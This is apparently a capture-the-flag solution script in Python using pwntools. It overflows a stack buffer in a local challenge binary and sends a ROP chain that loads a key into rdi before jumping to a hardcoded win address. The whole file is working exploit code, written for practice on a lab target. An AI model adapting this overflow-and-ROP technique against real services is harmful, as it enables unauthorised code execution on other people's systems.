#!/usr/bin/env python3

from pwn import *

context.terminal = ['tmux', 'splitw', '-h']
context.arch = 'amd64'

elf = ELF('./chall')
rop = ROP(elf)
rdi = p64(rop.rdi.address)
ret = p64(rop.ret.address)

padding = b'p' * 40
win_addr = b'\x11\x12\x40\x00\x00\x00\x00\x00'
key = b'\x44\x53\x43\x48\x00\x00\x00\x00'
payload = b''.join([padding, rdi, key, ret, win_addr])

p = remote('localhost', 15858)
#p = process('./chall')
#p = gdb.debug('./chall')
p.recvuntil("Court")
p.sendline(payload)
p.interactive()
